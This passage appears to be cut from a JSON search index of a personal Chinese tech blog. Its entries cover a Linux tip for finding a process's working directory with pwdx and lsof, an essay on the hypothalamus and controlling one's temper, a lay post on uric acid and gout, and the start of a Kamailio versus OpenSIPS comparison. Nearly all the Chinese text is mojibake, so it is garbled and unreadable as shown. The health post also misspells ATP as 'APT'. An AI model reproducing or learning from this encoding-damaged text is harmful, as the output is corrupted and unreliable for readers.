é…ç½®ä¸æ˜¾ç¤ºç‰ˆæœ¬å·"},{"content":"pwdx pid lsof -p pid | grep cwd ","permalink":"https://wdd.js.org/posts/2020/05/azkyhl/","summary":"pwdx pid lsof -p pid | grep cwd ","title":"è·å–è¿›ç¨‹å·¥ä½œç›®å½•"},{"content":" äººçš„å¤§è„‘ä¸­æœ‰ä¸ªå™¨å®˜ï¼Œå«åšä¸‹ä¸˜è„‘ã€‚ä¸‹ä¸˜è„‘æœ‰æ§åˆ¶ä½“æ¸©æ§åˆ¶çš„åŠŸèƒ½ã€‚åˆšå‡ºç”Ÿçš„å©´å„¿ï¼Œä¸‹ä¸˜è„‘å‘è‚²ä¸å®Œå…¨ï¼Œæ— æ³•è°ƒèŠ‚è‡ªå·±çš„ä½“æ¸©ã€‚æ‰€ä»¥ä¸€èˆ¬éƒ½æŠŠå°å®å®åŒ…è¢«å­é‡Œï¼Œè€Œå¥¹åªèƒ½é€šè¿‡å“­é—¹ååº”è‡ªå·±çš„ä¸é€‚ã€‚\néšç€èº«ä½“çš„å‘è‚²ï¼Œä¸‹ä¸˜è„‘é€æ¸æŒæ¡ä½“æ¸©æ§åˆ¶çš„åŠŸèƒ½ã€‚\nç™½å¤©è¶Šæ¥è¶Šé•¿ï¼Œä»ç”µè„‘å±å¹•ä¸ŠæŠ¬èµ·å¤´ï¼Œå‘ç°å·²ç»æœ‰äººæ”¶æ‹¾æ¡Œé¢ï¼Œå‡†å¤‡å¥½è¦ä¸‹ç­äº†ã€‚\nä¸çŸ¥ä¸è§‰ï¼Œå·²ç»å…­ç‚¹å¤šäº†ã€‚\nå¤•é˜³è¥¿ä¸‹ï¼Œæ™šéœä¼¼ç«ï¼Œå‡‰é£ä¹ ä¹ ã€‚\næ¼•æ²³æ³¾çš„è…¾è®¯å¤§æ¥¼ï¼Œå½±å­è¢«æ‹‰åˆ°åœ°ä¸‹åœè½¦åœºçš„å…¥å£ï¼Œå½·ä½›æ˜¯æƒ…äººé—´çš„æ³•å¼èˆŒå»ã€‚\nå›­åŒºé‡Œè¡ŒäººåŒ†åŒ†ï¼Œè½¦è¾†ç¼“ç¼“ï½\nææŒ‡ç®—èµ·ï¼Œæ¯•ä¸šå·²å››å¹´ã€‚æ—¶é—´å¦‚ç™½é©¹è¿‡éš™ï¼ŒæŒ‡é—´æµæ²™ã€‚\næç„¶é—´ï¼Œä¸‰åå°†è‡³ï¼Œå°šæœªè€Œç«‹ã€‚\nå°å­©å­çˆ±æ†åˆ†æ˜ï¼Œå–œæ¬¢ä¸ä¸å–œæ¬¢å°±ç›´æ¥è¯´ï¼Œä¸æ‡‚å¾—æ‹å¼¯æŠ¹è§’ã€‚\næˆå¹´äººæ”¾ä¸‹çˆ±æ†ï¼Œåªæœ‰ç”Ÿå­˜\næ— è®ºå¦‚ä½•ï¼Œä½ åº”å½“ä½“è°…åˆ«äººçš„ä¸–ç•Œä¸ä½ çš„ä¸åŒã€‚\nå¯¹ä½ æ¥è¯´ï¼Œå¾ˆå®¹æ˜“ç†è§£çš„é—®é¢˜ã€‚å¯èƒ½å¯¹åˆ«äººæ¥è¯´ï¼Œæ˜¯éš¾ä»¥ç†è§£çš„ã€‚\nä¸è¦å°†è‡ªå·±å½“ä½œå¹²æŸ´ï¼Œç¨å¾®ä¸€ç‚¹ï¼Œå°±æˆçƒˆç«ã€‚\nå½“ä½ çŸ¥é“ä½ å°†è¦è¯´çš„è¯ä¼šè®©åˆ«äººéš¾å ªæ—¶ï¼Œè¯·å’½ä¸‹å»å§ã€‚\nä¸è¦è½»æ˜“å¦å®šä¸€ä¸ªäººçš„å·¥ä½œä»·å€¼ï¼Œæ¯ä¸ªäººéƒ½å¸Œæœ›è‡ªå·±å¾—åˆ°è‚¯å®šã€‚\næ— è®ºæ˜¯å¯¹å¾…é™Œç”Ÿäººã€åŒäº‹ã€æˆ–è€…æ˜¯æœ‹å‹ã€‚\næˆ‘ä»¬ä¸æ˜¯åˆšå‡ºç”Ÿçš„å©´å„¿ï¼Œæˆ‘ä»¬æœ‰å®Œå…¨å‘è‚²çš„ä¸‹ä¸˜è„‘ã€‚\næ§åˆ¶ä½ çš„ä½“æ¸©ï¼ŒåŒæ—¶ä¹Ÿæ§åˆ¶ä½ çš„è„¾æ°”ï¼Œä½ è¯´è¯çš„æ–¹å¼ã€‚\næ¯ä¸ªäººéƒ½å€¼å¾—æ¸©æŸ”ä»¥å¾…ï¼Œå³ä½¿æ˜¯ä½ ä¸å–œæ¬¢çš„äººã€‚\nä½ å¥½ï¼Œä¸‹ä¸˜è„‘ï½\n","permalink":"https://wdd.js.org/posts/2020/05/nkegg6/","summary":"äººçš„å¤§è„‘ä¸­æœ‰ä¸ªå™¨å®˜ï¼Œå«åšä¸‹ä¸˜è„‘ã€‚ä¸‹ä¸˜è„‘æœ‰æ§åˆ¶ä½“æ¸©æ§åˆ¶çš„åŠŸèƒ½ã€‚åˆšå‡ºç”Ÿçš„å©´å„¿ï¼Œä¸‹ä¸˜è„‘å‘è‚²ä¸å®Œå…¨ï¼Œæ— æ³•è°ƒèŠ‚è‡ªå·±çš„ä½“æ¸©ã€‚æ‰€ä»¥ä¸€èˆ¬éƒ½æŠŠå°å®å®åŒ…è¢«å­é‡Œï¼Œè€Œå¥¹åªèƒ½é€šè¿‡å“­é—¹ååº”è‡ªå·±çš„ä¸é€‚ã€‚\néšç€èº«ä½“çš„å‘è‚²ï¼Œä¸‹ä¸˜è„‘é€æ¸æŒæ¡ä½“æ¸©æ§åˆ¶çš„åŠŸèƒ½ã€‚\nç™½å¤©è¶Šæ¥è¶Šé•¿ï¼Œä»ç”µè„‘å±å¹•ä¸ŠæŠ¬èµ·å¤´ï¼Œå‘ç°å·²ç»æœ‰äººæ”¶æ‹¾æ¡Œé¢ï¼Œå‡†å¤‡å¥½è¦ä¸‹ç­äº†ã€‚\nä¸çŸ¥ä¸è§‰ï¼Œå·²ç»å…­ç‚¹å¤šäº†ã€‚\nå¤•é˜³è¥¿ä¸‹ï¼Œæ™šéœä¼¼ç«ï¼Œå‡‰é£ä¹ ä¹ ã€‚\næ¼•æ²³æ³¾çš„è…¾è®¯å¤§æ¥¼ï¼Œå½±å­è¢«æ‹‰åˆ°åœ°ä¸‹åœè½¦åœºçš„å…¥å£ï¼Œå½·ä½›æ˜¯æƒ…äººé—´çš„æ³•å¼èˆŒå»ã€‚\nå›­åŒºé‡Œè¡ŒäººåŒ†åŒ†ï¼Œè½¦è¾†ç¼“ç¼“ï½\nææŒ‡ç®—èµ·ï¼Œæ¯•ä¸šå·²å››å¹´ã€‚æ—¶é—´å¦‚ç™½é©¹è¿‡éš™ï¼ŒæŒ‡é—´æµæ²™ã€‚\næç„¶é—´ï¼Œä¸‰åå°†è‡³ï¼Œå°šæœªè€Œç«‹ã€‚\nå°å­©å­çˆ±æ†åˆ†æ˜ï¼Œå–œæ¬¢ä¸ä¸å–œæ¬¢å°±ç›´æ¥è¯´ï¼Œä¸æ‡‚å¾—æ‹å¼¯æŠ¹è§’ã€‚\næˆå¹´äººæ”¾ä¸‹çˆ±æ†ï¼Œåªæœ‰ç”Ÿå­˜\næ— è®ºå¦‚ä½•ï¼Œä½ åº”å½“ä½“è°…åˆ«äººçš„ä¸–ç•Œä¸ä½ çš„ä¸åŒã€‚\nå¯¹ä½ æ¥è¯´ï¼Œå¾ˆå®¹æ˜“ç†è§£çš„é—®é¢˜ã€‚å¯èƒ½å¯¹åˆ«äººæ¥è¯´ï¼Œæ˜¯éš¾ä»¥ç†è§£çš„ã€‚\nä¸è¦å°†è‡ªå·±å½“ä½œå¹²æŸ´ï¼Œç¨å¾®ä¸€ç‚¹ï¼Œå°±æˆçƒˆç«ã€‚\nå½“ä½ çŸ¥é“ä½ å°†è¦è¯´çš„è¯ä¼šè®©åˆ«äººéš¾å ªæ—¶ï¼Œè¯·å’½ä¸‹å»å§ã€‚\nä¸è¦è½»æ˜“å¦å®šä¸€ä¸ªäººçš„å·¥ä½œä»·å€¼ï¼Œæ¯ä¸ªäººéƒ½å¸Œæœ›è‡ªå·±å¾—åˆ°è‚¯å®šã€‚\næ— è®ºæ˜¯å¯¹å¾…é™Œç”Ÿäººã€åŒäº‹ã€æˆ–è€…æ˜¯æœ‹å‹ã€‚\næˆ‘ä»¬ä¸æ˜¯åˆšå‡ºç”Ÿçš„å©´å„¿ï¼Œæˆ‘ä»¬æœ‰å®Œå…¨å‘è‚²çš„ä¸‹ä¸˜è„‘ã€‚\næ§åˆ¶ä½ çš„ä½“æ¸©ï¼ŒåŒæ—¶ä¹Ÿæ§åˆ¶ä½ çš„è„¾æ°”ï¼Œä½ è¯´è¯çš„æ–¹å¼ã€‚\næ¯ä¸ªäººéƒ½å€¼å¾—æ¸©æŸ”ä»¥å¾…ï¼Œå³ä½¿æ˜¯ä½ ä¸å–œæ¬¢çš„äººã€‚\nä½ å¥½ï¼Œä¸‹ä¸˜è„‘ï½","title":"ä½ å¥½ï¼Œä¸‹ä¸˜è„‘"},{"content":"ä»ç»†èƒè¯´èµ· äººä½“ç”±ç»†èƒç»„æˆã€‚äººä½“çš„ç»†èƒä¸­å¤§çº¦æœ‰40-60ä¸‡äº¿ä¸ªã€‚ç»†èƒæ— æ—¶æ— åˆ»ä¸å†æ–°è€æ›´æ›¿ã€æ–°é™ˆä»£è°¢ã€‚\nå¾®è§‚ä¸–ç•Œçš„ç»†èƒå˜åŒ–ï¼Œååº”åœ¨äººä½“ç”Ÿäº§ï¼Œå°±æ˜¯ä¸€ä¸ªäººä»æˆé•¿åˆ°è¡°è€çš„è¿‡ç¨‹ã€‚\nç»†èƒä¸­æœ‰ä¸€ç§é‡è¦çš„ç‰©è´¨ï¼Œæ ¸é…¸ã€‚æ ¸é…¸æ˜¯è„±æ°§æ ¸ç³–æ ¸é…¸(DNA)å’Œæ ¸ç³–æ ¸é…¸(RNA)çš„æ€»ç§°ã€‚\næ ¸é…¸ç”±æ— æ•°çš„æ ¸è‹·é…¸ç»„æˆï¼Œæ ¸è‹·é…¸é‡Œæœ‰ä¸€ç§ç‰©è´¨å«åšå˜Œå‘¤ã€‚è€Œå˜Œå‘¤å’Œäººä½“çš„å°¿é…¸æœ‰ç€å¯†ä¸å¯åˆ†çš„å…³ç³»ã€‚\né™¤äº†ä½œä¸ºé—ä¼ ç‰©è´¨çš„ä¸€éƒ¨åˆ†ï¼Œå˜Œå‘¤ä¸­çš„è…ºå˜Œå‘¤ä¹Ÿæ˜¯è…ºè‹·ä¸‰ç£·é…¸(ATP)çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚APTæ˜¯äººä½“ç›´æ¥çš„èƒ½é‡æ¥æºã€‚\nåœ¨å‰§çƒˆè¿åŠ¨æ—¶ï¼ŒAPTä¼šè¿›ä¸€æ­¥åˆ†è§£æˆè…ºå˜Œå‘¤ã€‚\næ€»ä¹‹ï¼šå°¿é…¸å’Œå˜Œå‘¤çš„å…³ç³»éå¸¸å¯†åˆ‡ã€‚äººä½“ç»†èƒçš„é—ä¼ ç‰©è´¨ä»¥åŠä½œä¸ºèƒ½é‡æ¥æºçš„APTéƒ½ä¼šäº§ç”Ÿå˜Œå‘¤ã€‚\nå°¿é…¸æ¥æºåˆ†ç±» å†…æºæ€§å°¿é…¸ï¼š æ¥è‡ªäººä½“è‡ªèº«ç»†èƒè¡°äº¡ï¼Œæ®‹ç•™çš„å˜Œå‘¤ç»è¿‡é…¶çš„ä½œç”¨äº§ç”Ÿå°¿é…¸ å¤–æºæ€§å°¿é…¸: å¤§å¤šæ¥è‡ªé£Ÿç‰©ä¸­çš„å˜Œå‘¤ç±»åŒ–åˆç‰©ã€æ ¸é…¸ã€æ ¸è›‹ç™½ç­‰ç‰©è´¨ã€ç»è¿‡é…¶çš„ä½œç”¨ä¸‹äº§ç”Ÿå°¿é…¸ã€‚ æˆ‘ä»¬èº«ä½“ä¸­çš„å°¿é…¸2/3æ¥è‡ªè‡ªèº«çš„ç”Ÿå‘½æ´»åŠ¨, 1/3æ¥è‡ªé£Ÿç‰©ã€‚\nå°¿é…¸çš„åˆæˆä¸æ’æ³„ å¤§éƒ¨åˆ†çš„å˜Œå‘¤åœ¨è‚è„ä¸­ç»è¿‡æ°§åŒ–ä»£è°¢ã€å˜æˆå°¿é…¸ã€‚åœ¨è¯è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸¤ç±»é…¶æ‰®æ¼”ç€é‡è¦ä½œç”¨ã€‚ æŠ‘åˆ¶å°¿é…¸åˆæˆçš„é…¶ ä¿ƒè¿›å°¿é…¸åˆæˆçš„é…¶ 2/3çš„å°¿é…¸é€šè¿‡è‚¾è„æ’å‡ºã€‚è‚¾è„åªæœ‰ä¹Ÿæœ‰èƒ½å¤Ÿä¿ƒè¿›æˆ–è€…æŠ‘åˆ¶å°¿é…¸é‡å¸æ”¶çš„é…¶ã€‚ 1/3çš„å°¿é…¸é€šè¿‡è‚ é“æ’å‡º æ‰€ä»¥å°¿é…¸è¾ƒé«˜çš„æ‚£è€…ï¼ŒåŒ»ç”Ÿä¼šè®©ä½ æŠ½è¡€æŸ¥è‚åŠŸèƒ½å’Œè‚¾åŠŸèƒ½ï¼Œå¦‚æœè‚è„ä¸­çš„æŸäº›æŒ‡æ ‡å¼‚å¸¸ï¼Œä¹Ÿä¼šè¿›ä¸€æ­¥é€šè¿‡Bè¶…å»åšè¿›ä¸€æ­¥çš„åˆ¤æ–­ã€‚\nå¾ˆå¤šäººè¯¯ä»¥ä¸ºå°¿é…¸æ˜¯æŸ¥å°¿æ¶²ï¼Œå®é™…ä¸Šè¿™æ˜¯è¢«å°¿é…¸çš„åå­—è¯¯è§£äº†ï¼Œå°¿é…¸æ˜¯æŠ½è¡€æ£€æµ‹çš„ã€‚\näººä½“ä¸­é…¶åœ¨å£°æ˜æ´»åŠ¨ä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ã€‚é…¶å°±å¥½åƒæ˜¯å¤ªæä¸­çš„é˜´ä¸é˜³ä¸€æ ·ï¼Œç›¸äº’åˆ¶è¡¡è¾¾åˆ°å¹³è¡¡ä¹‹æ—¶ï¼Œèº«ä½“æ‰ä¼šå¥åº·ã€‚å¦åˆ™é˜´é˜³å¤±è¡¡ï¼Œå¿…ç„¶ä¼šå­˜åœ¨èº«ä½“ç—…å˜ã€‚\nå¦å¤–ä¸€äº›é™ä½å°¿é…¸çš„è¯å“ï¼Œä¾‹å¦‚è‹¯æº´é©¬éš†ç‰‡ï¼Œå…¶è¯ç†ä¹Ÿæ˜¯é€šè¿‡é™ä½è‚¾è„å¯¹å°¿é…¸çš„é‡å¸æ”¶ï¼Œæ¥ä¿ƒè¿›å°¿é…¸çš„æ’æ³„çš„ã€‚\né£Ÿç‰©ä¸­çš„å°¿é…¸å¯¹äººä½“å½±å“æœ‰å¤šå¤§ï¼Ÿ å…·ä½“å“ªäº›ä¸èƒ½åƒï¼Œå“ªäº›èƒ½åƒï¼Œç½‘ä¸Šéƒ½æœ‰å¾ˆå¤šèµ„æ–™äº†ã€‚æ€»ä¹‹ï¼Œå¤§é±¼å¤§è‚‰æ˜¯è¦å°½é‡é¿å…çš„ã€‚é£Ÿç‰©ä¸»è¦è¦ä»¥æ¸…æ·¡ä¸ºä¸»ï¼Œåƒé¥­ä¸è¦åƒæ’‘ï¼Œå°½é‡è¿Ÿåˆ°7åˆ†é¥±ï¼Œæˆ–è€…è¿Ÿåˆ°ä¸é¥¿ä¸ºä½³ã€‚\né«˜å°¿é…¸çš„å±å®³ æœ‰æº¶è§£åº¦ç›¸å…³çŸ¥è¯†çš„åŒå­¦éƒ½ä¼šçŸ¥é“ï¼Œæº¶è´¨åœ¨æº¶æ¶²ä¸­éƒ½æ˜¯ç”±æº¶è§£åº¦çš„ï¼Œè¶…è¿‡æº¶è§£åº¦ä¹‹åï¼Œç‰©è´¨å°±ä¼šæå‡ºã€‚å°¿é…¸ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œè¿‡é¥±å’Œçš„å°¿é…¸ä¼šæå‡ºç§°ä¸ºå°¿é…¸ç»“æ™¶ã€‚\nè¿™äº›ç»“æ™¶ä¼šæ²‰ç§¯åœ¨å…³èŠ‚å’Œå„ç§è½¯ç»„ç»‡ï¼Œå°±å¯èƒ½é€ æˆè¿™äº›éƒ¨ä½çš„æŸå®³ã€‚\nå½“å°¿é…¸ç»“æ™¶é™„ç€åœ¨å…³èŠ‚è½¯éª¨è¡¨é¢ä¸Šçš„æ»‘è†œä¸Šæ—¶ï¼Œè¡€æ¶²ä¸­çš„ç™½ç»†èƒä¼šæŠŠå®ƒå½“åšæ•Œäººï¼Œé‡Šæ”¾å„ç§é…¶å»è¿›æ”»ã€‚è¿™äº›é…¶åœ¨è¿›æ”»æ•Œäººçš„åŒæ—¶ï¼Œå¯¹è‡ªèº«çš„å…³èŠ‚è½¯éª¨çš„æº¶è§£å’Œè‡ªèº«è½¯ç»„ç»‡çš„æŸä¼¤ã€‚ å¯¹ç—›é£æ‚£è€…è€Œè¨€ï¼Œæ„Ÿå—åˆ°çš„å°±æ˜¯è‹¦ä¸å ªè¨€çš„ç—›é£æ€§å…³èŠ‚ç‚\nå¦å¤–ï¼Œå¤§é‡çš„å°¿é…¸æœ€ç»ˆæ˜¯é€šè¿‡è‚¾è„æ’æ³„çš„ï¼Œå¦‚æœå°¿é…¸åœ¨è‚¾è„ä¸Šæå‡ºã€‚å¯¹è‚¾è„ä¹Ÿä¼šé€ æˆéš¾ä»¥ä¿®å¤çš„æŸå®³ï¼Œç”šè‡³æ‚£ä¸Šå°¿æ¯’ç—‡ã€‚å…‰å¬è¿™ä¸ªå°¿æ¯’ç—‡çš„åå­—ï¼Œä½ å°±åº”è¯¥è¿™é“ï¼Œè¿™ä¸ªç—…æœ‰å¤šå‰å®³ã€‚å½“ä½ ç®¡ä¸ä½è‡ªå·±å˜´çš„æ—¶å€™ï¼Œæƒ³æƒ³å°¿æ¯’ç—‡å§ã€‚\nä¸è¦ç­‰åˆ°å¤±å»ä»»åŠ³ä»»æ€¨çš„è‚¾è„ä¹‹åï¼Œå†åæ‚”è«åŠã€‚\nå‚è€ƒ https://baike.baidu.com/item/%E4%BA%BA%E4%BD%93%E7%BB%86%E8%83%9E ","permalink":"https://wdd.js.org/posts/2020/05/teadt5/","summary":"ä»ç»†èƒè¯´èµ· äººä½“ç”±ç»†èƒç»„æˆã€‚äººä½“çš„ç»†èƒä¸­å¤§çº¦æœ‰40-60ä¸‡äº¿ä¸ªã€‚ç»†èƒæ— æ—¶æ— åˆ»ä¸å†æ–°è€æ›´æ›¿ã€æ–°é™ˆä»£è°¢ã€‚\nå¾®è§‚ä¸–ç•Œçš„ç»†èƒå˜åŒ–ï¼Œååº”åœ¨äººä½“ç”Ÿäº§ï¼Œå°±æ˜¯ä¸€ä¸ªäººä»æˆé•¿åˆ°è¡°è€çš„è¿‡ç¨‹ã€‚\nç»†èƒä¸­æœ‰ä¸€ç§é‡è¦çš„ç‰©è´¨ï¼Œæ ¸é…¸ã€‚æ ¸é…¸æ˜¯è„±æ°§æ ¸ç³–æ ¸é…¸(DNA)å’Œæ ¸ç³–æ ¸é…¸(RNA)çš„æ€»ç§°ã€‚\næ ¸é…¸ç”±æ— æ•°çš„æ ¸è‹·é…¸ç»„æˆï¼Œæ ¸è‹·é…¸é‡Œæœ‰ä¸€ç§ç‰©è´¨å«åšå˜Œå‘¤ã€‚è€Œå˜Œå‘¤å’Œäººä½“çš„å°¿é…¸æœ‰ç€å¯†ä¸å¯åˆ†çš„å…³ç³»ã€‚\né™¤äº†ä½œä¸ºé—ä¼ ç‰©è´¨çš„ä¸€éƒ¨åˆ†ï¼Œå˜Œå‘¤ä¸­çš„è…ºå˜Œå‘¤ä¹Ÿæ˜¯è…ºè‹·ä¸‰ç£·é…¸(ATP)çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚APTæ˜¯äººä½“ç›´æ¥çš„èƒ½é‡æ¥æºã€‚\nåœ¨å‰§çƒˆè¿åŠ¨æ—¶ï¼ŒAPTä¼šè¿›ä¸€æ­¥åˆ†è§£æˆè…ºå˜Œå‘¤ã€‚\næ€»ä¹‹ï¼šå°¿é…¸å’Œå˜Œå‘¤çš„å…³ç³»éå¸¸å¯†åˆ‡ã€‚äººä½“ç»†èƒçš„é—ä¼ ç‰©è´¨ä»¥åŠä½œä¸ºèƒ½é‡æ¥æºçš„APTéƒ½ä¼šäº§ç”Ÿå˜Œå‘¤ã€‚\nå°¿é…¸æ¥æºåˆ†ç±» å†…æºæ€§å°¿é…¸ï¼š æ¥è‡ªäººä½“è‡ªèº«ç»†èƒè¡°äº¡ï¼Œæ®‹ç•™çš„å˜Œå‘¤ç»è¿‡é…¶çš„ä½œç”¨äº§ç”Ÿå°¿é…¸ å¤–æºæ€§å°¿é…¸: å¤§å¤šæ¥è‡ªé£Ÿç‰©ä¸­çš„å˜Œå‘¤ç±»åŒ–åˆç‰©ã€æ ¸é…¸ã€æ ¸è›‹ç™½ç­‰ç‰©è´¨ã€ç»è¿‡é…¶çš„ä½œç”¨ä¸‹äº§ç”Ÿå°¿é…¸ã€‚ æˆ‘ä»¬èº«ä½“ä¸­çš„å°¿é…¸2/3æ¥è‡ªè‡ªèº«çš„ç”Ÿå‘½æ´»åŠ¨, 1/3æ¥è‡ªé£Ÿç‰©ã€‚\nå°¿é…¸çš„åˆæˆä¸æ’æ³„ å¤§éƒ¨åˆ†çš„å˜Œå‘¤åœ¨è‚è„ä¸­ç»è¿‡æ°§åŒ–ä»£è°¢ã€å˜æˆå°¿é…¸ã€‚åœ¨è¯è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸¤ç±»é…¶æ‰®æ¼”ç€é‡è¦ä½œç”¨ã€‚ æŠ‘åˆ¶å°¿é…¸åˆæˆçš„é…¶ ä¿ƒè¿›å°¿é…¸åˆæˆçš„é…¶ 2/3çš„å°¿é…¸é€šè¿‡è‚¾è„æ’å‡ºã€‚è‚¾è„åªæœ‰ä¹Ÿæœ‰èƒ½å¤Ÿä¿ƒè¿›æˆ–è€…æŠ‘åˆ¶å°¿é…¸é‡å¸æ”¶çš„é…¶ã€‚ 1/3çš„å°¿é…¸é€šè¿‡è‚ é“æ’å‡º æ‰€ä»¥å°¿é…¸è¾ƒé«˜çš„æ‚£è€…ï¼ŒåŒ»ç”Ÿä¼šè®©ä½ æŠ½è¡€æŸ¥è‚åŠŸèƒ½å’Œè‚¾åŠŸèƒ½ï¼Œå¦‚æœè‚è„ä¸­çš„æŸäº›æŒ‡æ ‡å¼‚å¸¸ï¼Œä¹Ÿä¼šè¿›ä¸€æ­¥é€šè¿‡Bè¶…å»åšè¿›ä¸€æ­¥çš„åˆ¤æ–­ã€‚\nå¾ˆå¤šäººè¯¯ä»¥ä¸ºå°¿é…¸æ˜¯æŸ¥å°¿æ¶²ï¼Œå®é™…ä¸Šè¿™æ˜¯è¢«å°¿é…¸çš„åå­—è¯¯è§£äº†ï¼Œå°¿é…¸æ˜¯æŠ½è¡€æ£€æµ‹çš„ã€‚\näººä½“ä¸­é…¶åœ¨å£°æ˜æ´»åŠ¨ä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ã€‚é…¶å°±å¥½åƒæ˜¯å¤ªæä¸­çš„é˜´ä¸é˜³ä¸€æ ·ï¼Œç›¸äº’åˆ¶è¡¡è¾¾åˆ°å¹³è¡¡ä¹‹æ—¶ï¼Œèº«ä½“æ‰ä¼šå¥åº·ã€‚å¦åˆ™é˜´é˜³å¤±è¡¡ï¼Œå¿…ç„¶ä¼šå­˜åœ¨èº«ä½“ç—…å˜ã€‚\nå¦å¤–ä¸€äº›é™ä½å°¿é…¸çš„è¯å“ï¼Œä¾‹å¦‚è‹¯æº´é©¬éš†ç‰‡ï¼Œå…¶è¯ç†ä¹Ÿæ˜¯é€šè¿‡é™ä½è‚¾è„å¯¹å°¿é…¸çš„é‡å¸æ”¶ï¼Œæ¥ä¿ƒè¿›å°¿é…¸çš„æ’æ³„çš„ã€‚\né£Ÿç‰©ä¸­çš„å°¿é…¸å¯¹äººä½“å½±å“æœ‰å¤šå¤§ï¼Ÿ å…·ä½“å“ªäº›ä¸èƒ½åƒï¼Œå“ªäº›èƒ½åƒï¼Œç½‘ä¸Šéƒ½æœ‰å¾ˆå¤šèµ„æ–™äº†ã€‚æ€»ä¹‹ï¼Œå¤§é±¼å¤§è‚‰æ˜¯è¦å°½é‡é¿å…çš„ã€‚é£Ÿç‰©ä¸»è¦è¦ä»¥æ¸…æ·¡ä¸ºä¸»ï¼Œåƒé¥­ä¸è¦åƒæ’‘ï¼Œå°½é‡è¿Ÿåˆ°7åˆ†é¥±ï¼Œæˆ–è€…è¿Ÿåˆ°ä¸é¥¿ä¸ºä½³ã€‚\né«˜å°¿é…¸çš„å±å®³ æœ‰æº¶è§£åº¦ç›¸å…³çŸ¥è¯†çš„åŒå­¦éƒ½ä¼šçŸ¥é“ï¼Œæº¶è´¨åœ¨æº¶æ¶²ä¸­éƒ½æ˜¯ç”±æº¶è§£åº¦çš„ï¼Œè¶…è¿‡æº¶è§£åº¦ä¹‹åï¼Œç‰©è´¨å°±ä¼šæå‡ºã€‚å°¿é…¸ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œè¿‡é¥±å’Œçš„å°¿é…¸ä¼šæå‡ºç§°ä¸ºå°¿é…¸ç»“æ™¶ã€‚\nè¿™äº›ç»“æ™¶ä¼šæ²‰ç§¯åœ¨å…³èŠ‚å’Œå„ç§è½¯ç»„ç»‡ï¼Œå°±å¯èƒ½é€ æˆè¿™äº›éƒ¨ä½çš„æŸå®³ã€‚\nå½“å°¿é…¸ç»“æ™¶é™„ç€åœ¨å…³èŠ‚è½¯éª¨è¡¨é¢ä¸Šçš„æ»‘è†œä¸Šæ—¶ï¼Œè¡€æ¶²ä¸­çš„ç™½ç»†èƒä¼šæŠŠå®ƒå½“åšæ•Œäººï¼Œé‡Šæ”¾å„ç§é…¶å»è¿›æ”»ã€‚è¿™äº›é…¶åœ¨è¿›æ”»æ•Œäººçš„åŒæ—¶ï¼Œå¯¹è‡ªèº«çš„å…³èŠ‚è½¯éª¨çš„æº¶è§£å’Œè‡ªèº«è½¯ç»„ç»‡çš„æŸä¼¤ã€‚ å¯¹ç—›é£æ‚£è€…è€Œè¨€ï¼Œæ„Ÿå—åˆ°çš„å°±æ˜¯è‹¦ä¸å ªè¨€çš„ç—›é£æ€§å…³èŠ‚ç‚\nå¦å¤–ï¼Œå¤§é‡çš„å°¿é…¸æœ€ç»ˆæ˜¯é€šè¿‡è‚¾è„æ’æ³„çš„ï¼Œå¦‚æœå°¿é…¸åœ¨è‚¾è„ä¸Šæå‡ºã€‚å¯¹è‚¾è„ä¹Ÿä¼šé€ æˆéš¾ä»¥ä¿®å¤çš„æŸå®³ï¼Œç”šè‡³æ‚£ä¸Šå°¿æ¯’ç—‡ã€‚å…‰å¬è¿™ä¸ªå°¿æ¯’ç—‡çš„åå­—ï¼Œä½ å°±åº”è¯¥è¿™é“ï¼Œè¿™ä¸ªç—…æœ‰å¤šå‰å®³ã€‚å½“ä½ ç®¡ä¸ä½è‡ªå·±å˜´çš„æ—¶å€™ï¼Œæƒ³æƒ³å°¿æ¯’ç—‡å§ã€‚\nä¸è¦ç­‰åˆ°å¤±å»ä»»åŠ³ä»»æ€¨çš„è‚¾è„ä¹‹åï¼Œå†åæ‚”è«åŠã€‚\nå‚è€ƒ https://baike.baidu.com/item/%E4%BA%BA%E4%BD%93%E7%BB%86%E8%83%9E ","title":"å°¿é…¸ç®€å²"},{"content":"ä¹‹å‰æˆ‘å†™è¿‡OpenSIPSçš„æ–‡ç« ï¼Œæ‰€ä»¥åœ¨å­¦ä¹ Kamailioæ˜¯ï¼Œä¼šå°è¯•å’ŒOpenSIPSåšå¯¹æ¯”ã€‚\nä»ä¸‹å›¾å¯ä»¥çœ‹å‡ºï¼ŒKamailioå’ŒOpensipsç®—æ˜¯åŒæ ¹åŒæºäº†ã€‚å¾ˆå¤šè¯­æ³•ã€ä¼ªå˜é‡ã€æ¨¡å—ä½¿ç”¨æ–¹å¼ï¼Œä¸¤è€…éƒ½æä¸ºç›¸ä¼¼ã€‚\nä¸ä¸€æ ·çš„ç‚¹ ç„¶è€Œæ€»ä½“æ¥è¯´ï¼Œkamailioç›¸æ¯”OpenSIPSï¼Œæ›´åŠ çµæ´»ã€‚ å¦‚æœæœ‰æœºä¼šï¼Œå°è¯•ä¸‹kamailioä¹Ÿæœªå°ä¸å¯ã€‚è€Œä¸”kamailioçš„git startæ•°é‡æ¯”OpenSIPSå¤šå¾ˆå¤šï¼Œè€Œä¸”issueä¹Ÿæ¯”OpenSIPSå°‘ã€‚\nKamailio æœ‰wikiç¤¾åŒºï¼Œæ³¨å†Œä¹‹åï¼Œå¯ä»¥æ¥ç¼–è¾‘æ–‡æ¡£ï¼Œç›¸æ¯”äºOpenSIPSåªæœ‰å®˜æ–¹æ–‡æ¡£ï¼Œkamailioæ˜¾å¾—æ›´å®¹æ˜“è®©äººäº²è¿‘ï¼Œæé«˜äº†ç”¨æˆ·çš„å‚ä¸åº¦ã€‚ è„šæœ¬ä¸Š kamailioæ”¯æŒä¸‰ç§ä¸åŒçš„æ³¨é‡Šé£æ ¼ï¼Œopensipsåªæ”¯æŒä¸€ç§ kamailioæ”¯æŒç±»ä¼¼cè¯­è¨€çš„å®å®šä¹‰çš„æ–¹å¼å†™è„šæœ¬ï¼Œå› è€Œkamailioçš„è„šæœ¬å¯ä»¥ä¸å€ŸåŠ©å¤–éƒ¨å·¥å…·çš„æƒ…å†µä¸‹ï¼Œå†™çš„éå¸¸çµæ´»ã€‚å¯ä»¥å‚è€ƒ 